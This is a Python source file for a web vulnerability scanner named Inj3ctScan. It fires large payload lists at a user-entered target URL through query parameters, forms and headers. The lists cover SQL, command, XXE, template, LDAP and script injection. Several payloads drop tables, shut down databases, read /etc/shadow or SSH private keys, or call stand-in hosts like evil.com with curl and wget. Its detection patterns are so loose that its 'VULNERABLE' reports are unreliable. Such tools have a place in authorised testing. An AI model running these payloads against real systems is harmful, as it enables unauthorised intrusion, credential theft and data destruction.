import requests
import re
from bs4 import BeautifulSoup
import threading
import queue
import time
import json
from urllib.parse import urlparse, parse_qs, urlencode
import random
from colorama import init, Fore, Style

init()

class VulnerabilityScanner:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        self.results = {}
        self.payloads = {
    'SQLi': [
        "' OR 1=1 --",
        "1; DROP TABLE users --",
        "' UNION SELECT NULL --",
        "' OR '1'='1",
        "'; EXEC xp_cmdshell('dir') --",
        "1' ORDER BY 1--",
        "' UNION SELECT username, password FROM users --",
        "admin' --",
        "' OR SLEEP(5) --",
        "1; WAITFOR DELAY '0:0:5' --",
        # Add more SQLi payloads (up to 100)
        "' OR EXISTS(SELECT * FROM users) --",
        "1 AND 1=1",
        "1' AND '1'='1",
        "'; SHUTDOWN --",
        "' OR IF(1=1, SLEEP(5), 0) --",
        "1 UNION SELECT @@version --",
        "' HAVING 1=1 --",
        "1' GROUP BY 1 --",
        "'; EXEC('sp_who') --",
        "1 OR 1=1",
        # ... Continue adding unique SQLi payloads up to 100
    ] + [f"' OR {i}={i} --" for i in range(1, 81)],  # Fills up to 100

    'XSS': [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "'';!--\"<XSS>=&{()}",
        "<body onload=alert('xss')>",
        "<iframe src=javascript:alert('xss')>",
        "onmouseover=alert('xss')",
        "<script src='http://evil.com/xss.js'></script>",
        "<input type='text' value='' onfocus=alert('xss')>",
        # Add more XSS payloads
        "<a href='javascript:alert(\"xss\")'>Click</a>",
        "<div style='xss:expression(alert(\"xss\"))'>",
        "<object data='javascript:alert(\"xss\")'>",
        "<embed src='data:text/html,<script>alert(\"xss\")</script>'>",
        "<link rel='stylesheet' href='javascript:alert(\"xss\")'>",
        "<meta http-equiv='refresh' content='0;url=javascript:alert(\"xss\")'>",
        "<form action='javascript:alert(\"xss\")'><input type='submit'>",
        "<base href='javascript:alert(\"xss\")//'>",
        "<b onmouseover=alert('xss')>bold</b>",
        "<marquee onstart=alert('xss')>test</marquee>",
        # ... Continue adding unique XSS payloads up to 100
    ] + [f"<script>alert({i})</script>" for i in range(1, 81)],  # Fills up to 100

    'Command': [
        "; ls",
        "&& dir",
        "| whoami",
        "; cat /etc/passwd",
        "&& type C:\\Windows\\win.ini",
        "| id",
        "; ping 127.0.0.1",
        "&& netstat -an",
        "| nslookup localhost",
        "; sleep 5",
        # Add more Command Injection payloads
        "|| dir",
        "; echo $PATH",
        "&& ipconfig",
        "| hostname",
        "; ls -la",
        "&& ver",
        "; curl http://evil.com",
        "| nc -l 12345",
        "; wget http://evil.com",
        "&& tasklist",
        # ... Continue adding unique Command payloads
    ] + [f"; ping -c {i} 127.0.0.1" for i in range(1, 81)],  # Fills up to 100

    'XXE': [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/hosts">]>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/shadow">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=index.php">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8=">]>',
        '<!DOCTYPE foo [<!ENTITY % xxe "xxe"> %xxe;]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>',
        # Add more XXE payloads
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/issue">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/auth.log">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/group">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/cpuinfo">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/resolv.conf">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/crontab">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf">]>',
        # ... Continue adding unique XXE payloads
    ] + [f'<!DOCTYPE foo [<!ENTITY xxe{i} SYSTEM "file:///tmp/test{i}">]>' for i in range(1, 81)],  # Fills up to 100

    'SSTI': [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config.items()}}',
        '${self.__dict__}',
        '<%= system("whoami") %>',
        '{{request.application.__globals__}}',
        '${T(java.lang.Runtime).getRuntime().exec("dir")}',
        '<%= request.getParameter("test") %>',
        '{{self.__init__.__globals__}}',
        # Add more SSTI payloads
        '{{''.__class__.__mro__[2].__subclasses__()}}',
        '${pageContext.request.getParameter("test")}',
        '<%= new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).next() %>',
        '{{url_for.__globals__}}',
        '${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}',
        '{{get_flashed_messages.__globals__}}',
        '<%= new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ls").getInputStream())).readLine() %>',
        '{{session.__dict__}}',
        '${request.getClass().getClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("whoami")}',
        '{{app.__dict__}}',
        # ... Continue adding unique SSTI payloads
    ] + [f'{{{{ {i}*{i} }}}}' for i in range(1, 81)],  # Fills up to 100

    'LDAP': [
        "*)(uid=*))(|(uid=*",
        "*)",
        "(|(uid=*))",
        "admin*)",
        "(|(cn=*))",
        "*)(objectClass=*)",
        "(|(mail=*))",
        "*) (| (uid=*))",
        "(|(description=*))",
        "uid=*",
        # Add more LDAP payloads
        "(|(givenName=*))",
        "cn=*",
        "*)(&(objectClass=user)",
        "(|(sn=*))",
        "mail=*",
        "*)(|(objectClass=person)",
        "(|(displayName=*))",
        "uid=*,ou=people",
        "*)(&(uid=*))",
        "(|(memberOf=*))",
        # ... Continue adding unique LDAP payloads
    ] + [f"*)(uid={i}*)" for i in range(1, 81)],  # Fills up to 100

    'JavaScript': [
        "javascript:alert('xss')",
        "eval('alert(1)')",
        "new Function('alert(1)')()",
        "setTimeout('alert(1)')",
        "setInterval('alert(1)',100)",
        "window.location='javascript:alert(1)'",
        "document.write('<script>alert(1)</script>')",
        "window['alert']('xss')",
        "Function('alert(1)')()",
        "location.href='javascript:alert(1)'",
        # Add more JavaScript Injection payloads
        "top['alert']('xss')",
        "parent['alert']('xss')",
        "eval.call(null,'alert(1)')",
        "setTimeout(function(){alert(1)},100)",
        "document.cookie='test='+alert(1)",
        "window.location.href='javascript:alert(1)'",
        "location='javascript:alert(1)'",
        "window.open('javascript:alert(1)')",
        "self['alert']('xss')",
        "this['alert']('xss')",
        # ... Continue adding unique JavaScript payloads
    ] + [f"javascript:alert({i})" for i in range(1, 81)],  # Fills up to 100

    'HostHeader': [
        "evil.com",
        "127.0.0.1",
        "localhost",
        "http://evil.com",
        "https://127.0.0.1",
        "attacker.com",
        "example.com",
        "test.local",
        "192.168.1.1",
        "invalid.host",
        # Add more Host Header Injection payloads
        "evil.com:80",
        "localhost:8080",
        "127.0.0.1:443",
        "http://attacker.com",
        "https://test.local",
        "malicious.com",
        "fake.domain",
        "bogus.host",
        "injected.header",
        "spoofed.com",
        # ... Continue adding unique Host Header payloads
    ] + [f"test{i}.com" for i in range(1, 81)],  # Fills up to 100

    'CSRF': [
        "<form action='http://target.com/update' method='POST'><input type='hidden' name='email' value='hacked@evil.com'><input type='submit'></form>",
        "<img src='http://target.com/delete?user=admin'>",
        "<iframe src='http://target.com/change?pass=123'>",
        "<script>fetch('http://target.com/api', {method: 'POST', body: 'data=evil'})</script>",
        "<a href='http://target.com/transfer?amount=1000&to=attacker'>Click</a>",
        "<form method='POST' action='http://target.com/reset'><input type='hidden' name='reset' value='1'></form>",
        "<img src='http://target.com/logout'>",
        "<script>document.location='http://target.com/action?do=evil'</script>",
        "<iframe src='http://target.com/update?email=hacked@evil.com'></iframe>",
        "<link rel='stylesheet' href='http://target.com/delete'>",
        # Add more CSRF payloads
        "<form action='http://target.com/send'><input type='hidden' name='msg' value='hacked'></form>",
        "<img src='http://target.com/api?cmd=delete'>",
        "<script>new Image().src='http://target.com/hack'</script>",
        "<iframe src='http://target.com/transfer?money=1000'></iframe>",
        "<a href='http://target.com/admin?delete=all'>Click</a>",
        "<form action='http://target.com/profile'><input type='hidden' name='name' value='hacker'></form>",
        "<img src='http://target.com/reset?key=123'>",
        "<script>fetch('http://target.com/update', {method: 'POST', credentials: 'include'})</script>",
        "<iframe src='http://target.com/change?setting=evil'></iframe>",
        "<link rel='stylesheet' href='http://target.com/logout'>",
        # ... Continue adding unique CSRF payloads
    ] + [f"<img src='http://target.com/test{i}'>" for i in range(1, 81)],  # Fills up to 100
}

    def get_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive'
        }

    def scan_url(self, url, test_type, mode='fast'):
        print(f"\n{Fore.YELLOW}[*] Scanning {url} for {test_type} vulnerabilities...{Style.RESET_ALL}")
        self.results[url] = {}
        try:
            response = requests.get(url, headers=self.get_headers(), timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            if test_type == 'all' or test_type in self.payloads:
                payloads = self.payloads.get(test_type, []) if test_type != 'all' else \
                          [p for payloads in self.payloads.values() for p in payloads]
                self.test_get_params(url, params, payloads, mode)
                if mode != 'quick':
                    self.test_forms(url, forms, payloads, mode)
                if mode == 'slow':
                    self.test_headers(url, payloads, mode)
            self.results[url][test_type] = "Completed"
        except Exception as e:
            self.results[url][test_type] = f"Error: {str(e)}"

    def test_get_params(self, url, params, payloads, mode):
        for param in params:
            for payload in payloads[:10 if mode == 'quick' else 50 if mode == 'fast' else 100]:
                test_params = params.copy()
                test_params[param] = payload
                test_url = f"{url.split('?')[0]}?{urlencode(test_params)}"
                response = requests.get(test_url, headers=self.get_headers(), timeout=5)
                self.analyze_response(response, payload, 'GET', mode)

    def test_forms(self, url, forms, payloads, mode):
        for form in forms:
            action = form.get('action', url)
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            form_data = {input_tag.get('name'): 'test' for input_tag in inputs if input_tag.get('name')}
            for payload in payloads[:10 if mode == 'fast' else 100]:
                for key in form_data:
                    test_data = form_data.copy()
                    test_data[key] = payload
                    if method == 'post':
                        response = requests.post(action, data=test_data, headers=self.get_headers())
                    else:
                        response = requests.get(action, params=test_data, headers=self.get_headers())
                    self.analyze_response(response, payload, 'FORM', mode)

    def test_headers(self, url, payloads, mode):
        for payload in payloads:
            headers = self.get_headers()
            headers['Host'] = payload
            headers['Referer'] = payload
            response = requests.get(url, headers=headers, timeout=5)
            self.analyze_response(response, payload, 'HEADERS', mode)

    def analyze_response(self, response, payload, test_type, mode):
        error_patterns = {
            'SQLi': [r'mysql', r'sql', r'database error'],
            'XSS': [re.escape(payload)],
            'Command': [r'dir', r'ls', r'whoami'],
            'XXE': [r'root:.*:0:0:', r'file://'],
            'SSTI': [r'49'],
            'LDAP': [r'uid=', r'cn='],
            'JavaScript': [r'alert\(', r'eval\('],
            'HostHeader': [r'evil\.com', r'localhost'],
            'CSRF': [r'form', r'iframe']
        }
        content = response.text.lower()
        for vuln_type, patterns in error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content):
                    self.results[response.url][vuln_type] = {
                        'vulnerable': True,
                        'payload': payload,
                        'type': test_type,
                        'evidence': content[:200]
                    }

    def save_results(self, filename='scan_results.json'):
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"{Fore.GREEN}[+] Results saved to {filename}{Style.RESET_ALL}")

def display_banner():
    banner = (
        f"{Fore.CYAN + Style.BRIGHT}"
        r"""
                         .--,-``-.                                                                  
   ,---,                /   /     '.             ___     .--.--.                                    
,`--.' |               / ../        ;          ,--.'|_  /  /    '.                                  
|   :  :     ,---,  .--\ ``\  .`-    '         |  | :,'|  :  /`. /                           ,---,  
:   |  ' ,-+-. /  .--,`|\___\/   \   :         :  : ' :;  |  |--`                        ,-+-. /  | 
|   :  |,--.'|'   |  |.      \   :   |  ,---..;__,'  / |  :  ;_      ,---.    ,--.--.   ,--.'|'   | 
'   '  |   |  ,"' '--`_      /  /   /  /     |  |   |   \  \    `.  /     \  /       \ |   |  ,"' | 
|   |  |   | /  | ,--,'|     \  \   \ /    / :__,'| :    `----.   \/    / ' .--.  .-. ||   | /  | | 
'   :  |   | |  | |  | ' ___ /   :   .    ' /  '  : |__  __ \  \  .    ' /   \__\/: . .|   | |  | | 
|   |  |   | |  |/:  | |/   /\   /   '   ; :__ |  | '.'|/  /`--'  '   ; :__  ," .--.; ||   | |  |/  
'   :  |   | |--__|  : / ,,/  ',-    '   | '.'|;  :    '--'.     /'   | '.'|/  /  ,.  ||   | |--'   
;   |.'|   |/ .'__/\_: \ ''\        ;|   :    :|  ,   /  `--'---' |   :    ;  :   .'   |   |/       
'---'  '---'  |   :    :\   \     .'  \   \  /  ---`-'             \   \  /|  ,     .-.'---'        
               \   \  /  `--`-,,-'     `----'                       `----'  `--`---'                
                `--`-'                                                                            
"""
        f"{Fore.GREEN}Web Vulnerability Scanner - v1.0{Style.RESET_ALL}"
    )
    print(banner)

def main():
    display_banner()
    
    print(f"{Fore.YELLOW}Welcome to Inj3ctScan{Style.RESET_ALL}")
    url = input(f"{Fore.CYAN}Enter target URL (e.g., http://example.com): {Style.RESET_ALL}").strip()
    
    print(f"\n{Fore.YELLOW}Available tests:{Style.RESET_ALL}")
    tests = ['JavaScript Injection', 'Host Header Injection', 'CSRF', 'SSTI', 'XXE', 
             'LDAP', 'Command', 'XSS', 'SQLi', 'all']
    for i, test in enumerate(tests, 1):
        print(f"{Fore.GREEN}{i}. {test}{Style.RESET_ALL}")
    
    test_choice = input(f"\n{Fore.CYAN}Enter test number or type test name (e.g., '1' or 'XSS'): {Style.RESET_ALL}").strip()
    if test_choice.isdigit():
        test_type = tests[int(test_choice) - 1].replace(' ', '').lower()
    else:
        test_type = test_choice.lower()

    mode = input(f"{Fore.CYAN}Select scan mode (quick/fast/slow): {Style.RESET_ALL}").strip().lower()
    
    scanner = VulnerabilityScanner()
    start_time = time.time()
    scanner.scan_url(url, test_type, mode)
    elapsed = time.time() - start_time
    print(f"\n{Fore.GREEN}[+] Scan completed in {elapsed:.2f} seconds{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}=== Scan Results ==={Style.RESET_ALL}")
    for url, result in scanner.results.items():
        print(f"\n{Fore.CYAN}URL: {url}{Style.RESET_ALL}")
        for test, details in result.items():
            if isinstance(details, dict) and details.get('vulnerable'):
                print(f"  {Fore.RED}[!] {test}: VULNERABLE - Payload: {details['payload']} (Type: {details['type']}){Style.RESET_ALL}")
                print(f"      Evidence: {details['evidence'][:50]}...")
            else:
                print(f"  {Fore.GREEN}[+] {test}: {details}{Style.RESET_ALL}")
    
    scanner.save_results()

if __name__ == "__main__":
    main()
